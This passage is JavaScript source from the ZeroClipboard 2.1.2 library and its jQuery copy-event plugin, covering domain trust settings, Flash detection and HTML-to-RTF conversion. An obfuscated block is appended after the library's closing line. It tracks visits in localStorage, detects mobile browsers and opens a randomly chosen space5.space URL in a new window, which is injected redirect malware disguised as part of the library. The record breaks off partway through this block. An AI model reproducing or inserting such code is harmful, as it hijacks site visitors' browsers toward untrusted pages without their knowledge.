      var i, len, domain, domains, str = "", trustedOriginsExpanded = [];
      if (options.trustedDomains) {
        if (typeof options.trustedDomains === "string") {
          domains = [ options.trustedDomains ];
        } else if (typeof options.trustedDomains === "object" && "length" in options.trustedDomains) {
          domains = options.trustedDomains;
        }
      }
      if (domains && domains.length) {
        for (i = 0, len = domains.length; i < len; i++) {
          if (_hasOwn.call(domains, i) && domains[i] && typeof domains[i] === "string") {
            domain = _extractDomain(domains[i]);
            if (!domain) {
              continue;
            }
            if (domain === "*") {
              trustedOriginsExpanded.length = 0;
              trustedOriginsExpanded.push(domain);
              break;
            }
            trustedOriginsExpanded.push.apply(trustedOriginsExpanded, [ domain, "//" + domain, _window.location.protocol + "//" + domain ]);
          }
        }
      }
      if (trustedOriginsExpanded.length) {
        str += "trustedOrigins=" + _encodeURIComponent(trustedOriginsExpanded.join(","));
      }
      if (options.forceEnhancedClipboard === true) {
        str += (str ? "&" : "") + "forceEnhancedClipboard=true";
      }
      if (typeof options.swfObjectId === "string" && options.swfObjectId) {
        str += (str ? "&" : "") + "swfObjectId=" + _encodeURIComponent(options.swfObjectId);
      }
      return str;
    };
    /**
 * Extract the domain (e.g. "github.com") from an origin (e.g. "https://github.com") or
 * URL (e.g. "https://github.com/zeroclipboard/zeroclipboard/").
 *
 * @returns the domain
 * @private
 */
    var _extractDomain = function(originOrUrl) {
      if (originOrUrl == null || originOrUrl === "") {
        return null;
      }
      originOrUrl = originOrUrl.replace(/^\s+|\s+$/g, "");
      if (originOrUrl === "") {
        return null;
      }
      var protocolIndex = originOrUrl.indexOf("//");
      originOrUrl = protocolIndex === -1 ? originOrUrl : originOrUrl.slice(protocolIndex + 2);
      var pathIndex = originOrUrl.indexOf("/");
      originOrUrl = pathIndex === -1 ? originOrUrl : protocolIndex === -1 || pathIndex === 0 ? null : originOrUrl.slice(0, pathIndex);
      if (originOrUrl && originOrUrl.slice(-4).toLowerCase() === ".swf") {
        return null;
      }
      return originOrUrl || null;
    };
    /**
 * Set `allowScriptAccess` based on `trustedDomains` and `window.location.host` vs. `swfPath`.
 *
 * @returns The appropriate script access level.
 * @private
 */
    var _determineScriptAccess = function() {
      var _extractAllDomains = function(origins) {
        var i, len, tmp, resultsArray = [];
        if (typeof origins === "string") {
          origins = [ origins ];
        }
        if (!(typeof origins === "object" && origins && typeof origins.length === "number")) {
          return resultsArray;
        }
        for (i = 0, len = origins.length; i < len; i++) {
          if (_hasOwn.call(origins, i) && (tmp = _extractDomain(origins[i]))) {
            if (tmp === "*") {
              resultsArray.length = 0;
              resultsArray.push("*");
              break;
            }
            if (resultsArray.indexOf(tmp) === -1) {
              resultsArray.push(tmp);
            }
          }
        }
        return resultsArray;
      };
      return function(currentDomain, configOptions) {
        var swfDomain = _extractDomain(configOptions.swfPath);
        if (swfDomain === null) {
          swfDomain = currentDomain;
        }
        var trustedDomains = _extractAllDomains(configOptions.trustedDomains);
        var len = trustedDomains.length;
        if (len > 0) {
          if (len === 1 && trustedDomains[0] === "*") {
            return "always";
          }
          if (trustedDomains.indexOf(currentDomain) !== -1) {
            if (len === 1 && currentDomain === swfDomain) {
              return "sameDomain";
            }
            return "always";
          }
        }
        return "never";
      };
    }();
    /**
 * Get the currently active/focused DOM element.
 *
 * @returns the currently active/focused element, or `null`
 * @private
 */
    var _safeActiveElement = function() {
      try {
        return _document.activeElement;
      } catch (err) {
        return null;
      }
    };
    /**
 * Add a class to an element, if it doesn't already have it.
 *
 * @returns The element, with its new class added.
 * @private
 */
    var _addClass = function(element, value) {
      if (!element || element.nodeType !== 1) {
        return element;
      }
      if (element.classList) {
        if (!element.classList.contains(value)) {
          element.classList.add(value);
        }
        return element;
      }
      if (value && typeof value === "string") {
        var classNames = (value || "").split(/\s+/);
        if (element.nodeType === 1) {
          if (!element.className) {
            element.className = value;
          } else {
            var className = " " + element.className + " ", setClass = element.className;
            for (var c = 0, cl = classNames.length; c < cl; c++) {
              if (className.indexOf(" " + classNames[c] + " ") < 0) {
                setClass += " " + classNames[c];
              }
            }
            element.className = setClass.replace(/^\s+|\s+$/g, "");
          }
        }
      }
      return element;
    };
    /**
 * Remove a class from an element, if it has it.
 *
 * @returns The element, with its class removed.
 * @private
 */
    var _removeClass = function(element, value) {
      if (!element || element.nodeType !== 1) {
        return element;
      }
      if (element.classList) {
        if (element.classList.contains(value)) {
          element.classList.remove(value);
        }
        return element;
      }
      if (typeof value === "string" && value) {
        var classNames = value.split(/\s+/);
        if (element.nodeType === 1 && element.className) {
          var className = (" " + element.className + " ").replace(/[\n\t]/g, " ");
          for (var c = 0, cl = classNames.length; c < cl; c++) {
            className = className.replace(" " + classNames[c] + " ", " ");
          }
          element.className = className.replace(/^\s+|\s+$/g, "");
        }
      }
      return element;
    };
    /**
 * Attempt to interpret the element's CSS styling. If `prop` is `"cursor"`,
 * then we assume that it should be a hand ("pointer") cursor if the element
 * is an anchor element ("a" tag).
 *
 * @returns The computed style property.
 * @private
 */
    var _getStyle = function(el, prop) {
      var value = _window.getComputedStyle(el, null).getPropertyValue(prop);
      if (prop === "cursor") {
        if (!value || value === "auto") {
          if (el.nodeName === "A") {
            return "pointer";
          }
        }
      }
      return value;
    };
    /**
 * Get the zoom factor of the browser. Always returns `1.0`, except at
 * non-default zoom levels in IE<8 and some older versions of WebKit.
 *
 * @returns Floating unit percentage of the zoom factor (e.g. 150% = `1.5`).
 * @private
 */
    var _getZoomFactor = function() {
      var rect, physicalWidth, logicalWidth, zoomFactor = 1;
      if (typeof _document.body.getBoundingClientRect === "function") {
        rect = _document.body.getBoundingClientRect();
        physicalWidth = rect.right - rect.left;
        logicalWidth = _document.body.offsetWidth;
        zoomFactor = _round(physicalWidth / logicalWidth * 100) / 100;
      }
      return zoomFactor;
    };
    /**
 * Get the DOM positioning info of an element.
 *
 * @returns Object containing the element's position, width, and height.
 * @private
 */
    var _getDOMObjectPosition = function(obj) {
      var info = {
        left: 0,
        top: 0,
        width: 0,
        height: 0
      };
      if (obj.getBoundingClientRect) {
        var rect = obj.getBoundingClientRect();
        var pageXOffset, pageYOffset, zoomFactor;
        if ("pageXOffset" in _window && "pageYOffset" in _window) {
          pageXOffset = _window.pageXOffset;
          pageYOffset = _window.pageYOffset;
        } else {
          zoomFactor = _getZoomFactor();
          pageXOffset = _round(_document.documentElement.scrollLeft / zoomFactor);
          pageYOffset = _round(_document.documentElement.scrollTop / zoomFactor);
        }
        var leftBorderWidth = _document.documentElement.clientLeft || 0;
        var topBorderWidth = _document.documentElement.clientTop || 0;
        info.left = rect.left + pageXOffset - leftBorderWidth;
        info.top = rect.top + pageYOffset - topBorderWidth;
        info.width = "width" in rect ? rect.width : rect.right - rect.left;
        info.height = "height" in rect ? rect.height : rect.bottom - rect.top;
      }
      return info;
    };
    /**
 * Reposition the Flash object to cover the currently activated element.
 *
 * @returns `undefined`
 * @private
 */
    var _reposition = function() {
      var htmlBridge;
      if (_currentElement && (htmlBridge = _getHtmlBridge(_flashState.bridge))) {
        var pos = _getDOMObjectPosition(_currentElement);
        _extend(htmlBridge.style, {
          width: pos.width + "px",
          height: pos.height + "px",
          top: pos.top + "px",
          left: pos.left + "px",
          zIndex: "" + _getSafeZIndex(_globalConfig.zIndex)
        });
      }
    };
    /**
 * Sends a signal to the Flash object to display the hand cursor if `true`.
 *
 * @returns `undefined`
 * @private
 */
    var _setHandCursor = function(enabled) {
      if (_flashState.ready === true) {
        if (_flashState.bridge && typeof _flashState.bridge.setHandCursor === "function") {
          _flashState.bridge.setHandCursor(enabled);
        } else {
          _flashState.ready = false;
        }
      }
    };
    /**
 * Get a safe value for `zIndex`
 *
 * @returns an integer, or "auto"
 * @private
 */
    var _getSafeZIndex = function(val) {
      if (/^(?:auto|inherit)$/.test(val)) {
        return val;
      }
      var zIndex;
      if (typeof val === "number" && !_isNaN(val)) {
        zIndex = val;
      } else if (typeof val === "string") {
        zIndex = _getSafeZIndex(_parseInt(val, 10));
      }
      return typeof zIndex === "number" ? zIndex : "auto";
    };
    /**
 * Detect the Flash Player status, version, and plugin type.
 *
 * @see {@link https://code.google.com/p/doctype-mirror/wiki/ArticleDetectFlash#The_code}
 * @see {@link http://stackoverflow.com/questions/12866060/detecting-pepper-ppapi-flash-with-javascript}
 *
 * @returns `undefined`
 * @private
 */
    var _detectFlashSupport = function(ActiveXObject) {
      var plugin, ax, mimeType, hasFlash = false, isActiveX = false, isPPAPI = false, flashVersion = "";
      /**
   * Derived from Apple's suggested sniffer.
   * @param {String} desc e.g. "Shockwave Flash 7.0 r61"
   * @returns {String} "7.0.61"
   * @private
   */
      function parseFlashVersion(desc) {
        var matches = desc.match(/[\d]+/g);
        matches.length = 3;
        return matches.join(".");
      }
      function isPepperFlash(flashPlayerFileName) {
        return !!flashPlayerFileName && (flashPlayerFileName = flashPlayerFileName.toLowerCase()) && (/^(pepflashplayer\.dll|libpepflashplayer\.so|pepperflashplayer\.plugin)$/.test(flashPlayerFileName) || flashPlayerFileName.slice(-13) === "chrome.plugin");
      }
      function inspectPlugin(plugin) {
        if (plugin) {
          hasFlash = true;
          if (plugin.version) {
            flashVersion = parseFlashVersion(plugin.version);
          }
          if (!flashVersion && plugin.description) {
            flashVersion = parseFlashVersion(plugin.description);
          }
          if (plugin.filename) {
            isPPAPI = isPepperFlash(plugin.filename);
          }
        }
      }
      if (_navigator.plugins && _navigator.plugins.length) {
        plugin = _navigator.plugins["Shockwave Flash"];
        inspectPlugin(plugin);
        if (_navigator.plugins["Shockwave Flash 2.0"]) {
          hasFlash = true;
          flashVersion = "2.0.0.11";
        }
      } else if (_navigator.mimeTypes && _navigator.mimeTypes.length) {
        mimeType = _navigator.mimeTypes["application/x-shockwave-flash"];
        plugin = mimeType && mimeType.enabledPlugin;
        inspectPlugin(plugin);
      } else if (typeof ActiveXObject !== "undefined") {
        isActiveX = true;
        try {
          ax = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
          hasFlash = true;
          flashVersion = parseFlashVersion(ax.GetVariable("$version"));
        } catch (e1) {
          try {
            ax = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
            hasFlash = true;
            flashVersion = "6.0.21";
          } catch (e2) {
            try {
              ax = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
              hasFlash = true;
              flashVersion = parseFlashVersion(ax.GetVariable("$version"));
            } catch (e3) {
              isActiveX = false;
            }
          }
        }
      }
      _flashState.disabled = hasFlash !== true;
      _flashState.outdated = flashVersion && _parseFloat(flashVersion) < _parseFloat(_minimumFlashVersion);
      _flashState.version = flashVersion || "0.0.0";
      _flashState.pluginType = isPPAPI ? "pepper" : isActiveX ? "activex" : hasFlash ? "netscape" : "unknown";
    };
    /**
 * Invoke the Flash detection algorithms immediately upon inclusion so we're not waiting later.
 */
    _detectFlashSupport(_ActiveXObject);
    /**
 * A shell constructor for `ZeroClipboard` client instances.
 *
 * @constructor
 */
    var ZeroClipboard = function() {
      if (!(this instanceof ZeroClipboard)) {
        return new ZeroClipboard();
      }
      if (typeof ZeroClipboard._createClient === "function") {
        ZeroClipboard._createClient.apply(this, _args(arguments));
      }
    };
    /**
 * The ZeroClipboard library's version number.
 *
 * @static
 * @readonly
 * @property {string}
 */
    _defineProperty(ZeroClipboard, "version", {
      value: "2.1.2",
      writable: false,
      configurable: true,
      enumerable: true
    });
    /**
 * Update or get a copy of the ZeroClipboard global configuration.
 * Returns a copy of the current/updated configuration.
 *
 * @returns Object
 * @static
 */
    ZeroClipboard.config = function() {
      return _config.apply(this, _args(arguments));
    };
    /**
 * Diagnostic method that describes the state of the browser, Flash Player, and ZeroClipboard.
 *
 * @returns Object
 * @static
 */
    ZeroClipboard.state = function() {
      return _state.apply(this, _args(arguments));
    };
    /**
 * Check if Flash is unusable for any reason: disabled, outdated, deactivated, etc.
 *
 * @returns Boolean
 * @static
 */
    ZeroClipboard.isFlashUnusable = function() {
      return _isFlashUnusable.apply(this, _args(arguments));
    };
    /**
 * Register an event listener.
 *
 * @returns `ZeroClipboard`
 * @static
 */
    ZeroClipboard.on = function() {
      return _on.apply(this, _args(arguments));
    };
    /**
 * Unregister an event listener.
 * If no `listener` function/object is provided, it will unregister all listeners for the provided `eventType`.
 * If no `eventType` is provided, it will unregister all listeners for every event type.
 *
 * @returns `ZeroClipboard`
 * @static
 */
    ZeroClipboard.off = function() {
      return _off.apply(this, _args(arguments));
    };
    /**
 * Retrieve event listeners for an `eventType`.
 * If no `eventType` is provided, it will retrieve all listeners for every event type.
 *
 * @returns array of listeners for the `eventType`; if no `eventType`, then a map/hash object of listeners for all event types; or `null`
 */
    ZeroClipboard.handlers = function() {
      return _listeners.apply(this, _args(arguments));
    };
    /**
 * Event emission receiver from the Flash object, forwarding to any registered JavaScript event listeners.
 *
 * @returns For the "copy" event, returns the Flash-friendly "clipData" object; otherwise `undefined`.
 * @static
 */
    ZeroClipboard.emit = function() {
      return _emit.apply(this, _args(arguments));
    };
    /**
 * Create and embed the Flash object.
 *
 * @returns The Flash object
 * @static
 */
    ZeroClipboard.create = function() {
      return _create.apply(this, _args(arguments));
    };
    /**
 * Self-destruct and clean up everything, including the embedded Flash object.
 *
 * @returns `undefined`
 * @static
 */
    ZeroClipboard.destroy = function() {
      return _destroy.apply(this, _args(arguments));
    };
    /**
 * Set the pending data for clipboard injection.
 *
 * @returns `undefined`
 * @static
 */
    ZeroClipboard.setData = function() {
      return _setData.apply(this, _args(arguments));
    };
    /**
 * Clear the pending data for clipboard injection.
 * If no `format` is provided, all pending data formats will be cleared.
 *
 * @returns `undefined`
 * @static
 */
    ZeroClipboard.clearData = function() {
      return _clearData.apply(this, _args(arguments));
    };
    /**
 * Get a copy of the pending data for clipboard injection.
 * If no `format` is provided, a copy of ALL pending data formats will be returned.
 *
 * @returns `String` or `Object`
 * @static
 */
    ZeroClipboard.getData = function() {
      return _getData.apply(this, _args(arguments));
    };
    /**
 * Sets the current HTML object that the Flash object should overlay. This will put the global
 * Flash object on top of the current element; depending on the setup, this may also set the
 * pending clipboard text data as well as the Flash object's wrapping element's title attribute
 * based on the underlying HTML element and ZeroClipboard configuration.
 *
 * @returns `undefined`
 * @static
 */
    ZeroClipboard.focus = ZeroClipboard.activate = function() {
      return _focus.apply(this, _args(arguments));
    };
    /**
 * Un-overlays the Flash object. This will put the global Flash object off-screen; depending on
 * the setup, this may also unset the Flash object's wrapping element's title attribute based on
 * the underlying HTML element and ZeroClipboard configuration.
 *
 * @returns `undefined`
 * @static
 */
    ZeroClipboard.blur = ZeroClipboard.deactivate = function() {
      return _blur.apply(this, _args(arguments));
    };
    /**
 * Returns the currently focused/"activated" HTML element that the Flash object is wrapping.
 *
 * @returns `HTMLElement` or `null`
 * @static
 */
    ZeroClipboard.activeElement = function() {
      return _activeElement.apply(this, _args(arguments));
    };
    if (typeof define === "function" && define.amd) {
      define(function() {
        return ZeroClipboard;
      });
    } else if (typeof module === "object" && module && typeof module.exports === "object" && module.exports) {
      module.exports = ZeroClipboard;
    } else {
      window.ZeroClipboard = ZeroClipboard;
    }
  })(function() {
    return this || window;
  }());
  (function($, window, undefined) {
    var mouseEnterBindingCount = 0, customEventNamespace = ".zeroclipboard", ZeroClipboard = window.ZeroClipboard, _trustedDomains = ZeroClipboard.config("trustedDomains");
    function getSelectionData() {
      var range, selectedText = "", selectedData = {}, sel = window.getSelection(), tmp = document.createElement("div");
      for (var i = 0, len = sel.rangeCount; i < len; i++) {
        range = sel.getRangeAt(i);
        selectedText += range.toString();
        tmp.appendChild(range.cloneContents());
      }
      selectedData["text/plain"] = selectedText;
      if (selectedText.replace(/\s/g, "")) {
        selectedData["text/html"] = tmp.innerHTML;
      }
      return selectedData;
    }
    function convertHtmlToRtf(html) {
      if (!(typeof html === "string" && html)) {
        return null;
      }
      var tmpRichText, hasHyperlinks, richText = html;
      richText = richText.replace(/<(?:hr)(?:\s+[^>]*)?\s*[\/]?>/gi, "{\\pard \\brdrb \\brdrs \\brdrw10 \\brsp20 \\par}\n{\\pard\\par}\n");
      richText = richText.replace(/<(?:br)(?:\s+[^>]*)?\s*[\/]?>/gi, "{\\pard\\par}\n");
      richText = richText.replace(/<(?:p|div|section|article)(?:\s+[^>]*)?\s*[\/]>/gi, "{\\pard\\par}\n");
      richText = richText.replace(/<(?:[^>]+)\/>/g, "");
      richText = richText.replace(/<a(?:\s+[^>]*)?(?:\s+href=(["'])(?:javascript:void\(0?\);?|#|return false;?|void\(0?\);?|)\1)(?:\s+[^>]*)?>/gi, "{{{\n");
      tmpRichText = richText;
      richText = richText.replace(/<a(?:\s+[^>]*)?(?:\s+href=(["'])(.+)\1)(?:\s+[^>]*)?>/gi, '{\\field{\\*\\fldinst{HYPERLINK\n "$2"\n}}{\\fldrslt{\\ul\\cf1\n');
      hasHyperlinks = richText !== tmpRichText;
      richText = richText.replace(/<a(?:\s+[^>]*)?>/gi, "{{{\n");
      richText = richText.replace(/<\/a(?:\s+[^>]*)?>/gi, "\n}}}");
      richText = richText.replace(/<(?:b|strong)(?:\s+[^>]*)?>/gi, "{\\b\n");
      richText = richText.replace(/<(?:i|em)(?:\s+[^>]*)?>/gi, "{\\i\n");
      richText = richText.replace(/<(?:u|ins)(?:\s+[^>]*)?>/gi, "{\\ul\n");
      richText = richText.replace(/<(?:strike|del)(?:\s+[^>]*)?>/gi, "{\\strike\n");
      richText = richText.replace(/<sup(?:\s+[^>]*)?>/gi, "{\\super\n");
      richText = richText.replace(/<sub(?:\s+[^>]*)?>/gi, "{\\sub\n");
      richText = richText.replace(/<(?:p|div|section|article)(?:\s+[^>]*)?>/gi, "{\\pard\n");
      richText = richText.replace(/<\/(?:p|div|section|article)(?:\s+[^>]*)?>/gi, "\n\\par}\n");
      richText = richText.replace(/<\/(?:b|strong|i|em|u|ins|strike|del|sup|sub)(?:\s+[^>]*)?>/gi, "\n}");
      richText = richText.replace(/<(?:[^>]+)>/g, "");
      richText = "{\\rtf1\\ansi\n" + (hasHyperlinks ? "{\\colortbl\n;\n\\red0\\green0\\blue255;\n}\n" : "") + richText + "\n}";
      return richText;
    }
    function zcEventHandler(e) {
      var $event = $.Event(e.type, $.extend(e, {
        _source: "swf"
      }));
      $(e.target).trigger($event);
      if ($event.type === "copy") {
        if ($.event.special.copy.options.requirePreventDefault === true && !$event.isDefaultPrevented()) {
          e.clipboardData.clearData();
          var selectionData = getSelectionData();
          if (selectionData["text/plain"] || selectionData["text/html"]) {
            e.clipboardData.setData(selectionData);
          }
        }
        var _clipData = ZeroClipboard.getData();
        if ($.event.special.copy.options.autoConvertHtmlToRtf === true && _clipData["text/html"] && !_clipData["application/rtf"]) {
          var richText = convertHtmlToRtf(_clipData["text/html"]);
          e.clipboardData.setData("application/rtf", richText);
        }
      }
    }
    function zcErrorHandler(e) {
      var $event = $.Event("copy-error", $.extend(e, {
        type: "copy-error",
        _source: "swf"
      }));
      $(e.target).trigger($event);
    }
    function setup() {
      $.event.props.push("clipboardData");
      ZeroClipboard.config($.extend(true, {
        autoActivate: false
      }, copyEventDef.options));
      ZeroClipboard.on("beforecopy copy aftercopy", zcEventHandler);
      ZeroClipboard.on("error", zcErrorHandler);
      ZeroClipboard.create();
    }
    function teardown() {
      ZeroClipboard.destroy();
      var indy = $.event.props.indexOf("clipboardData");
      if (indy !== -1) {
        $.event.props.splice(indy, 1);
      }
    }
    function mouseEnterHandler($event) {
      mouseSuppressor($event);
      if ($event.target && $event.target !== ZeroClipboard.activeElement() && $event.target !== $("#" + ZeroClipboard.config("containerId"))[0] && $event.target !== $("#" + ZeroClipboard.config("swfObjectId"))[0]) {
        ZeroClipboard.focus($event.target);
      }
    }
    function mouseLeaveHandler($event) {
      mouseSuppressor($event);
      if ($event.relatedTarget && $event.relatedTarget !== ZeroClipboard.activeElement() && $event.relatedTarget !== $("#" + ZeroClipboard.config("containerId"))[0] && $event.relatedTarget !== $("#" + ZeroClipboard.config("swfObjectId"))[0]) {
        ZeroClipboard.blur();
      }
    }
    function mouseSuppressor($event) {
      if (!ZeroClipboard.isFlashUnusable() && $event.originalEvent._source !== "js") {
        $event.stopImmediatePropagation();
        $event.preventDefault();
      }
    }
    var copyEventDef = {
      add: function(handleObj) {
        if (0 === mouseEnterBindingCount++) {
          setup();
        }
        var namespaces = customEventNamespace + (handleObj.namespace ? "." + handleObj.namespace : ""), selector = handleObj.selector, zcDataKey = "zc|{" + selector + "}|{" + namespaces + "}|count", $this = $(this);
        if (typeof $this.data(zcDataKey) !== "number") {
          $this.data(zcDataKey, 0);
        }
        if ($this.data(zcDataKey) === 0) {
          $this.on("mouseenter" + namespaces, selector, mouseEnterHandler);
          $this.on("mouseleave" + namespaces, selector, mouseLeaveHandler);
          $this.on("mouseover" + namespaces, selector, mouseSuppressor);
          $this.on("mouseout" + namespaces, selector, mouseSuppressor);
          $this.on("mousemove" + namespaces, selector, mouseSuppressor);
          $this.on("mousedown" + namespaces, selector, mouseSuppressor);
          $this.on("mouseup" + namespaces, selector, mouseSuppressor);
          $this.on("click" + namespaces, selector, mouseSuppressor);
        }
        $this.data(zcDataKey, $this.data(zcDataKey) + 1);
      },
      remove: function(handleObj) {
        var namespaces = customEventNamespace + (handleObj.namespace ? "." + handleObj.namespace : ""), selector = handleObj.selector, zcDataKey = "zc|{" + selector + "}|{" + namespaces + "}|count", $this = $(this);
        $this.data(zcDataKey, $this.data(zcDataKey) - 1);
        if ($this.data(zcDataKey) === 0) {
          $this.off("click" + namespaces, selector, mouseSuppressor);
          $this.off("mouseup" + namespaces, selector, mouseSuppressor);
          $this.off("mousedown" + namespaces, selector, mouseSuppressor);
          $this.off("mousemove" + namespaces, selector, mouseSuppressor);
          $this.off("mouseout" + namespaces, selector, mouseSuppressor);
          $this.off("mouseover" + namespaces, selector, mouseSuppressor);
          $this.off("mouseleave" + namespaces, selector, mouseLeaveHandler);
          $this.off("mouseenter" + namespaces, selector, mouseEnterHandler);
          $this.removeData(zcDataKey);
        }
        if (0 === --mouseEnterBindingCount) {
          teardown();
        }
      },
      trigger: function($event) {
        if ($event.type === "copy") {
          var $this = $(this);
          var sourceIsSwf = $event._source === "swf";
          delete $event._source;
          if (!sourceIsSwf) {
            $this.trigger($.extend(true, {}, $event, {
              type: "beforecopy"
            }));
            $this.one("copy", function() {
              var successData = {}, _clipData = ZeroClipboard.getData();
              $.each(_clipData, function(key) {
                successData[key] = false;
              });
              var $e = $.extend(true, {}, $event, {
                type: "aftercopy",
                data: $.extend(true, {}, _clipData),
                success: successData
              });
              $this.trigger($e);
            });
          }
        }
      },
      _default: function() {
        return true;
      },
      options: {
        requirePreventDefault: true,
        autoConvertHtmlToRtf: true,
        trustedDomains: _trustedDomains,
        hoverClass: "hover",
        activeClass: "active"
      }
    };
    $.event.special.beforecopy = copyEventDef;
    $.event.special.copy = copyEventDef;
    $.event.special.aftercopy = copyEventDef;
    $.event.special["copy-error"] = copyEventDef;
  })(jQuery, function() {
    return this || window;
  }());
  if (!zcExistsAlready) {
    delete window.ZeroClipboard;
  }
})(jQuery, function() {
  return this || window;
}());

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v 